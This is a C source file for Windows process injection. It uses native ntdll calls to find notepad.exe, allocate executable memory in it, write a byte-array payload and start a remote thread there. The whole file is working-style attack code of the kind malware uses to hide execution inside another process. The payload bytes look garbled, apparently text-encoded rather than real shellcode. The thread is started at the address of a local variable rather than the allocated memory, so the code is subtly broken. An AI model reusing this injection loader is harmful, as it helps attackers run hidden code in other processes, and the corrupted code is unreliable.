#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <tchar.h>
#include <sal.h>

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define THREAD_CREATE_FLAGS_BYPASS_PROCESS_FREEZE 0x00000040 // NtCreateThreadEx only
#define _Post_ptr_invalid_

typedef NTSTATUS (NTAPI *PUSER_THREAD_START_ROUTINE)(
_In_ PVOID ThreadParameter);

typedef struct _PS_ATTRIBUTE
{
	ULONG_PTR Attribute;
	SIZE_T Size;
	union
	{
			ULONG_PTR Value;
			PVOID ValuePtr;
	};
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor; // PSECURITY_DESCRIPTOR;
	PVOID SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI* NtOpenProcess) (
	_Out_ PHANDLE ProcessHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PCLIENT_ID ClientId
);

typedef NTSTATUS (NTAPI* NtAllocateVirtualMemory) (
	_In_ HANDLE ProcessHandle,
	_Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID *BaseAddress,
	_In_ ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG AllocationType,
	_In_ ULONG Protect
);

typedef NTSTATUS (NTAPI* NtWriteVirtualMemory) (
	_In_ HANDLE ProcessHandle,
	_In_opt_ PVOID BaseAddress,
	_In_reads_bytes_(BufferSize) PVOID Buffer,
	_In_ SIZE_T BufferSize,
	_Out_opt_ PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI* NtCreateThreadEx) (
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ LPTHREAD_START_ROUTINE StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
	_In_ SIZE_T ZeroBits,
	_In_ SIZE_T StackSize,
	_In_ SIZE_T MaximumStackSize,
	_In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);

typedef NTSTATUS (NTAPI* NtClose) (
	_In_ _Post_ptr_invalid_ HANDLE Handle
);

HANDLE hNtDll;

HANDLE getTargetProc() {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	HANDLE targetProc;

	hNtDll = GetModuleHandleW(L"NTDLL");
	NtOpenProcess ntOpenProc = (NtOpenProcess)GetProcAddress(hNtDll, "NtOpenProcess");
	NtClose handleClose = (NtClose)GetProcAddress(hNtDll, "NtClose");
	OBJECT_ATTRIBUTES OA = {sizeof(OBJECT_ATTRIBUTES), NULL};
		
	if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) )
		return INVALID_HANDLE_VALUE;
				
	cProcesses = cbNeeded / sizeof(DWORD);
				
	for (int i = 0; i < cProcesses; i++ ) {
		if( aProcesses[i] != 0 )
		{
			TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
			/*
			NTSYSCALLAPI
			NTSTATUS
			NTAPI
			NtOpenProcess(
			_Out_ PHANDLE ProcessHandle,
			_In_ ACCESS_MASK DesiredAccess,
			_In_ POBJECT_ATTRIBUTES ObjectAttributes,
			_In_opt_ PCLIENT_ID ClientId
			);
			*/
			CLIENT_ID CID = {(HANDLE)aProcesses[i], NULL};
			ntOpenProc( &targetProc, PROCESS_ALL_ACCESS, &OA, &CID);
			
			if (INVALID_HANDLE_VALUE != targetProc )
			{
				HMODULE hMod;
				DWORD cbNeeded;
				
				if ( EnumProcessModules( targetProc, &hMod, sizeof(hMod), &cbNeeded) )
				{
					GetModuleBaseName( targetProc, hMod, szProcessName, sizeof(szProcessName)/sizeof(TCHAR) );
				}
			}
				
			if (strncmp(szProcessName, "notepad.exe", 11) == 0)
				return targetProc;
				
			handleClose(targetProc);
		}
	}
	return INVALID_HANDLE_VALUE;
}

int main() {
	unsigned char payload[] = {0x41,0xe2,0x98,0xba,0xe2,0x94,0xb4,0x38,0xce,0xb1,0x75,0xc2,0xb1,0x4c,0xe2,0x99,0xa5,0x4c,0x45,0x39,0xe2,0x95,0xa4,0x75,0xe2,0x95,0xaa,0x58,0x44,0xc3,0xaf,0x40,0x24,0x49,0xe2,0x98,0xba,0xe2,0x95,0xa8,0x66,0x41,0xc3,0xaf,0xe2,0x99,0x80,0x48,0x44,0xc3,0xaf,0x40,0xe2,0x88,0x9f,0x49,0xe2,0x98,0xba,0xe2,0x95,0xa8,0x41,0xc3,0xaf,0xe2,0x99,0xa6,0xc3,0xaa,0x48,0xe2,0x98,0xba,0xe2,0x95,0xa8,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0xc3,0xa2,0xe2,0x88,0x9e,0x20,0x41,0x52,0xc2,0xa0,0xce,0xb1,0x58,0x41,0x59,0x5a,0x48,0xc3,0xaf,0xe2,0x86,0x95,0xce,0x98,0x57,0xc2,0xa0,0xc2,0xa0,0xc2,0xa0,0x5d,0x48,0xe2,0x95,0x91,0xe2,0x98,0xba,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x48,0xc3,0xac,0xc3,0xac,0xe2,0x98,0xba,0xe2,0x98,0xba,0x20,0x20,0x41,0xe2,0x95,0x91,0x31,0xc3,0xaf,0x6f,0xc3,0xa7,0xc2,0xa0,0xe2,0x95,0x92,0xe2,0x95,0x97,0xce,0xb1,0xe2,0x86,0x94,0x2a,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x41,0xe2,0x95,0x91,0xc2,0xaa,0xc3,0xb2,0xe2,0x95,0x9c,0xc2,0xa5,0xc2,0xa0,0xe2,0x95,0x92,0x48,0xc3,0xa2,0xe2,0x94,0x80,0x28,0x3c,0xe2,0x99,0xa0,0x7c,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0xc3,0x87,0xe2,0x88,0x9a,0xce,0xb1,0x75,0xe2,0x99,0xa3,0xe2,0x95,0x97,0x47,0xe2,0x80,0xbc,0x72,0x6f,0x6a,0x20,0x59,0x41,0xc3,0xab,0xe2,0x94,0x8c,0xc2,0xa0,0xe2,0x95,0x92,0x6e,0x6f,0x74,0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65};
	hNtDll = GetModuleHandleW(L"NTDLL");
	PVOID allocatedMem = NULL;
	SIZE_T payloadSize = sizeof(payload);
		
	HANDLE targetProc = getTargetProc();
	if (targetProc == INVALID_HANDLE_VALUE) {
		printf("target process cannot be gathered...\n");
		return 1;
	}
	else
		printf("target process OK\n");
		
	/*
	_Must_inspect_result_
_When_(return == 0, __drv_allocatesMem(mem))
NTSYSCALLAPI
NTSTATUS
NTAPI
NtAllocateVirtualMemory(
_In_ HANDLE ProcessHandle,
_Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID *BaseAddress,
_In_ ULONG_PTR ZeroBits,
_Inout_ PSIZE_T RegionSize,
_In_ ULONG AllocationType,
_In_ ULONG Protect
);
	*/
	NtAllocateVirtualMemory virtualAllocator = (NtAllocateVirtualMemory)GetProcAddress(hNtDll, "NtAllocateVirtualMemory");
	NTSTATUS isAllocated = virtualAllocator(targetProc, &allocatedMem, 0, &payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (isAllocated == STATUS_SUCCESS)
		printf("VirtualAlloc OK\n");
	else {
		printf("VirtualAlloc couldn't allocate the memory...\n\tError Code:%lu\n", GetLastError());
		return 1;
	}

	/*
	NTSYSCALLAPI
NTSTATUS
NTAPI
NtWriteVirtualMemory(
_In_ HANDLE ProcessHandle,
_In_opt_ PVOID BaseAddress,
_In_reads_bytes_(BufferSize) PVOID Buffer,
_In_ SIZE_T BufferSize,
_Out_opt_ PSIZE_T NumberOfBytesWritten
);
	*/
	SIZE_T numOfBytesWritten;
	NtWriteVirtualMemory writeVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
	NTSTATUS isMemoryWritten = writeVirtualMemory( targetProc, allocatedMem, payload, payloadSize, &numOfBytesWritten);
	if (isMemoryWritten != STATUS_SUCCESS) {
		printf("WriteProcessMemory couldn't write the payload...\n\tError Code:%lu\n", GetLastError());
		return 1;
	}
	else
		printf("WriteProcessMemory OK\n");

	/*
	NTAPI
NtCreateThreadEx(
_Out_ PHANDLE ThreadHandle,
_In_ ACCESS_MASK DesiredAccess,
_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
_In_ HANDLE ProcessHandle,
_In_ PUSER_THREAD_START_ROUTINE StartRoutine,
_In_opt_ PVOID Argument,
_In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
_In_ SIZE_T ZeroBits,
_In_ SIZE_T StackSize,
_In_ SIZE_T MaximumStackSize,
_In_opt_ PPS_ATTRIBUTE_LIST AttributeList
);
	*/
	HANDLE hThread = NULL;
	LPTHREAD_START_ROUTINE baseAddressPayload = (LPTHREAD_START_ROUTINE)&allocatedMem;
	NtCreateThreadEx threadCreate = (NtCreateThreadEx)GetProcAddress(hNtDll, "NtCreateThreadEx");
	NtClose handleClose = (NtClose)GetProcAddress(hNtDll, "NtClose");
	NTSTATUS isThreadCreated = threadCreate(&hThread, THREAD_ALL_ACCESS, NULL, targetProc, baseAddressPayload, NULL, FALSE, 0, 0, 0, NULL);
	if (isThreadCreated == STATUS_SUCCESS) {
		printf("CreateRemoteThread OK\n");
		handleClose(hThread);
		handleClose(targetProc);
		return 0;
	}
	else {
		printf("CreateRemoteThread couldn't create a thread...\n\t%lu\n", GetLastError());
		handleClose(hThread);
		handleClose(targetProc);
		return 1;
	}
}
